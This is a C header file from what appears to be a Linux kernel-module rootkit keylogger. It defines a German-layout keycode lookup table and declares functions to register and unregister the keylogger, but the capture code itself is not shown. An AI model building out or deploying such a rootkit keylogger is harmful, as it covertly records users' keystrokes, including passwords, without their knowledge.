#ifndef LKM_ROOTKIT_KEYLOGGER_H
#define LKM_ROOTKIT_KEYLOGGER_H

#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");

#define KEYCODE_LOOKUP_TABLE_SIZE 91

//Keycode lookup table for GER layout
const char *keycode_lookup_table[][3] = {
    {"\0", "\0", "\0"},
    {"_ESCAPE_", "\0", "\0"}, {"1", "!", "\0"}, {"2", "\"", "²"},
    {"3", "§", "³"}, {"4", "$", "¼"}, {"5", "%%", "½"}, {"6", "&", "¬"},
    {"7", "/", "{"}, {"8", "(", "["}, {"9", ")", "]"}, {"0", "=", "}"},
    {"ß", "?", "\\"}, {"´", "´", "\0"}, {"_BACK_", "\0", "\0"},
    {"_TAB_", "\0", "\0"}, {"q", "Q", "@"}, {"w", "W", "\0"},
    {"e", "E", "€"}, {"r", "R", "\0"}, {"t", "T", "\0"},
    {"z", "Z", "\0"}, {"u", "U", "\0"}, {"i", "I", "\0"},
    {"o", "O", "\0"}, {"p", "P", "\0"}, {"ü", "Ü", "\0"},
    {"+", "*", "~"}, {"_ENTER_", "_ENTER_", "\0"}, {"_FN_", "_FN_", "\0"},
    {"a", "A", "\0"}, {"s", "S", "\0"}, {"d", "D", "\0"},
    {"f", "F", "\0"}, {"g", "G", "\0"}, {"h", "H", "\0"},
    {"j", "J", "\0"}, {"k", "K", "\0"}, {"l", "L", "\0"},
    {"ö", "Ö", "\0"}, {"ä", "Ä", "\0"}, {"^", "°", "\0"},
    {"_LSHIFT_", "_LSHIFT_", "\0"}, {"#", "'", "\0"},
    {"y", "Y", "\0"}, {"x", "X", "\0"}, {"c", "C", "\0"}, //row starts at 0x2C
    {"v", "V", "\0"}, {"b", "B", "\0"}, {"n", "N", "\0"},
    {"m", "M", "µ"}, {",", ";", "\0"}, {".", ":", "\0"},
    {"-", "_", "\0"},
    {"_RSHIFT_", "_RSHIFT_", "\0"}, //shift at 0x36
    {"*", "\0", "\0"}, //multiply on numblock
    {"_ALT_", "_ALT_", "\0"}, {"_SPACE_", "_SPACE_", "\0"}, 
    {"_CAPITAL_", "_CAPITAL_", "_CAPITAL_"}, //3A
    {"F1", "F1", "\0"}, {"F2", "F2", "\0"}, {"F3", "F3", "\0"},
    {"F4", "F4", "\0"}, {"F5", "F5", "\0"}, {"F6", "F6", "\0"},
    {"F7", "F7", "\0"}, {"F8", "F8", "\0"}, {"F9", "F9", "\0"},
    {"F10", "F10", "\0"}, {"_NUMLOCK_", "_NUMLOCK_", "\0"}, {"_SCROLL_", "_SCROLL_", "\0"}, //Scroll is 0x46
    {"7", "\0", "\0"}, {"8", "\0", "\0"}, {"9", "\0", "\0"},
    {"-", "\0", "\0"}, {"4", "\0", "\0"}, {"5", "\0", "\0"},
    {"6", "\0", "\0"}, {"1", "\0", "\0"}, {"2", "\0", "\0"},
    {"3", "\0", "\0"}, {"0", "_INSERT_", "_INSERT_"}, {",", "_DELETE_", "_DELETE_"},    //last is 0x53
    {"_SNAPSHOT_", "_SNAPSHOT_", "\0"}, {"\0", "\0", "\0"}, {"<", ">", "|"},    //last is 0x56
    {"F11", "F11", "\0"}, {"F12", "F12", "\0"}, {"\0", "\0", "\0"}, //last is 0x59
    {"\0", "\0", "\0"},{"_LWIN_", "_LWIN_", "\0"}, {"_RWIN_", "_RWIN_", "\0"}, //Ox5B
};

void register_keylogger(void);

void unregister_keylogger(void);

#endif